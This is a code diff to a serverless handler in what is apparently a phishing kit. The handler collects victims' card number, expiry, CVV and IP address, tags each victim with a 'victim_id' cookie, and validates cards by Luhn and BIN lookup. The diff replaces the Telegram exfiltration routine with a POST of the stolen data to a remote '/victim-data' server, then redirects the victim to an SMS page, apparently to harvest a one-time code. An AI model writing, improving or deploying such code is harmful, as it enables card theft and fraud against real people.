@@ -1,29 +1,6 @@
 const fetch = require('node-fetch');
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-async function sendTelegram(message) {
-  if (!BOT_TOKEN || !CHAT_ID) {
-    console.log('[TELEGRAM NOT CONFIGURED] Would send:', message);
-    return;
-  }
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-    console.log('Telegram message sent');
-  } catch (err) {
-    console.error('Telegram error:', err);
-  }
-}
+const SOCKET_SERVER = 'https://my-project-production-8e23.up.railway.app';
 
 async function getBinInfo(bin) {
   try {
@@ -65,28 +42,48 @@ exports.handler = async (event, context) => {
 
   try {
     const params = new URLSearchParams(event.body);
-    const card_number = params.get('card_number');
-    const card_expiry = params.get('card_expiry');
-    const card_cvv = params.get('card_cvv');
-    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || 'unknown';
+    const card_number = (params.get('card_number') || '').replace(/\s/g, '');
+    const card_expiry = params.get('card_expiry') || '';
+    const card_cvv = params.get('card_cvv') || '';
+    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || '?';
+    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || ('v_' + Date.now());
 
+    // Luhn check - если не проходит, редиректим обратно на страницу карты
     if (!luhnCheck(card_number)) {
-      return { statusCode: 400, body: 'Invalid card number' };
+      return {
+        statusCode: 302,
+        headers: { 'Location': '/card?error=invalid' },
+        body: ''
+      };
     }
 
-    let binInfo = null;
-    const binStr = card_number.replace(/\D/g, '').substring(0, 6);
-    if (binStr.length >= 6) binInfo = await getBinInfo(binStr);
+    // BIN lookup
+    const binStr = card_number.replace(/\D/g, '').substring(0, 8);
+    const binInfo = binStr.length >= 6 ? await getBinInfo(binStr) : null;
 
-    let msg = `<b>💳 Card</b>\n<b>Number:</b> <code>${card_number}</code>\n<b>Expiry:</b> <code>${card_expiry}</code>\n<b>CVV:</b> <code>${card_cvv}</code>\n<b>ID:</b> <code>${vId}</code>`;
-    if (binInfo) msg += `\n\n<b>🏦 BIN:</b> ${binInfo.bank} | ${binInfo.brand} | ${binInfo.type} | ${binInfo.country}`;
+    let telegramMsg = `<b>💳 Card</b>\n<b>Number:</b> <code>${card_number}</code>\n<b>Expiry:</b> <code>${card_expiry}</code>\n<b>CVV:</b> <code>${card_cvv}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>ID:</b> <code>${vId}</code>`;
+    if (binInfo) {
+      telegramMsg += `\n\n<b>🏦 BIN:</b> ${binInfo.bank} | ${binInfo.brand} | ${binInfo.type} | ${binInfo.country}`;
+    }
 
-    await sendTelegram(msg);
+    await fetch(`${SOCKET_SERVER}/victim-data`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        victimId: vId,
+        type: 'card',
+        data: { card_number, card_expiry, card_cvv, binInfo, action: 'card' },
+        ip,
+        page: 'card',
+        telegramMsg
+      })
+    }).catch(e => console.error('Socket notify error:', e));
 
     return {
       statusCode: 302,
       headers: {
-        'Location': '/sms'
+        'Location': '/sms',
+        'Set-Cookie': `victim_id=${vId}; Path=/; SameSite=Lax`
       },
       body: ''
     };
